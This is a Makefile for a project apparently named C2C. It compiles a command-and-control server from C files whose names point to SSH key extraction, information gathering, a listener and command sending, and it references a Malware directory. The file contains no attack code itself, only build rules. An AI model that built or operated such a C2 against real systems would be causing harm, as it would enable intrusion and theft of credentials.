# Project name
PROJECT_NAME = C2C

# Compiler
CC = gcc
CFLAGS = -Wall -Wextra -O2 -g

# Directories for source files
SRC_DIR_C2 = C2
SRC_DIR_MALWARE = Malware

# Source files for the C2 component
SRC_C2 = $(SRC_DIR_C2)/add_ssh.c \
         $(SRC_DIR_C2)/database.c \
         $(SRC_DIR_C2)/extract_informations.c \
         $(SRC_DIR_C2)/extract_ssh.c \
         $(SRC_DIR_C2)/listener.c \
         $(SRC_DIR_C2)/send_commands.c \
         $(SRC_DIR_C2)/user_interface.c \
         $(SRC_DIR_C2)/main.c

# Executables
C2_EXEC = c2_executable

# Default target: build C2 executable
all: $(C2_EXEC)

$(C2_EXEC): $(SRC_C2:.c=.o)
	$(CC) $(CFLAGS) -o $(C2_EXEC) $(SRC_C2:.c=.o)

# Compile the database program separately
database: $(SRC_DIR_C2)/database.c $(SRC_DIR_C2)/main.c
	$(CC) $(CFLAGS) -o database $(SRC_DIR_C2)/database.c $(SRC_DIR_C2)/main.c

# Rule to compile object files
%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# Clean generated files
clean:
	rm -f $(SRC_DIR_C2)/*.o $(C2_EXEC) database

# Run the database executable
run_database:
	./database

.PHONY: all clean run_database
